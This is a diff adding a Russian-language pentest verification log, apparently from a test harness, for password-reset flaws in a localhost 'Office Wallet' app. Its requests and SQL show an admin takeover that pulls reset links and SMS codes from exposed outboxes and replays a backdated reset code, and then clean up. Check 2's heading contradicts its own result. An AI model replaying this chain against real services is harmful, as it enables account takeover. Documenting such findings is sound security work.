@@ -1,0 +1,73 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-26
+################################################################################################
+--- проверка 1/2 ---
+== 3. OW-26/OW-27: полный захват пароля жертвы через сброс ==
+    · Сброс чужого пароля собирается из трёх кусков, и все три уже у нас:
+    ·  1) ссылка уходит на почту жертвы, но /mail отдаёт весь outbox любому вошедшему
+    ·     (handlers_auth.go:181-200) — забираем её оттуда;
+    ·  2) код подтверждения лежит в SMS-шлюзе, открытом кукой из шага 2;
+    ·  3) срок действия кода не проверяется и лимита попыток нет (handlers_auth.go:146).
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot  login=adminw (письмо и SMS уходят в общие ящики)
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → GET /mail  (весь outbox виден иванову)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → GET /gateway/sms  (код по заявке #43)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ссылка: /password/reset?rid=43   код: 673407
+    → POST /password/reset  rid=43&sms_code=673407&password=Hack1234
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$7RaARAmS4/VeSpErIzadquTgcFRSRRRpafp9dEjpKQ2dulhMCa5R2
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-26/OW-27 · сброс сменил пароль жертвы
+    │ reset request rid=43 sms_code=<получен из gateway> → HTTP 200
+    │ password_hash изменён: $2a$10$.WcgUxFiEZL… → $2a$10$7RaARAmS4/V…
+    │ POST /login новым паролем → HTTP 302 (сессия выдана)
+    └─
+[+] пароль админа заменён, зашли: adminw / Hack1234
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    пароль adminw восстановлен: hash совпал=True
+
+--- проверка 2/2 ---
+== OW-26 · reset code не истекает и не гасится после использования ==
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot login=adminw
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → SQL SELECT id||'|'||sms_code FROM password_resets WHERE user_id=(SELECT id FROM users WHERE login='adminw') ORDER BY id DESC LIMIT 1
+    ← psql 44|647432
+    → SQL UPDATE password_resets SET created_at='2000-01-01', used=FALSE WHERE id=44
+    ← psql UPDATE 1
+    → POST /password/reset with 26-year-old reset code rid=44
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT used FROM password_resets WHERE id=44
+    ← psql t
+    → POST same /password/reset rid=44 again
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Новый пароль · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    ┌─ АРТЕФАКТ · OW-26 · просроченный reset принят
+    │ password_resets.created_at=2000-01-01; запрос не проверил срок
+    │ первый POST /password/reset → HTTP 200; новый пароль принят
+    │ после первого использования used=t; повторный POST → HTTP 200, второй пароль отклонён
+    └─
+[+] старый reset не истекает; после использования код помечается использованным
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL DELETE FROM password_resets WHERE id=44
+    ← psql DELETE 1
+    → SQL DELETE FROM sms_outbox WHERE rid=44
+    ← psql DELETE 1
+    → SQL DELETE FROM mail_outbox WHERE body LIKE '%rid=44%'
+    ← psql DELETE 1
+    OW-26: исходный password_hash восстановлен; reset/outbox записи удалены
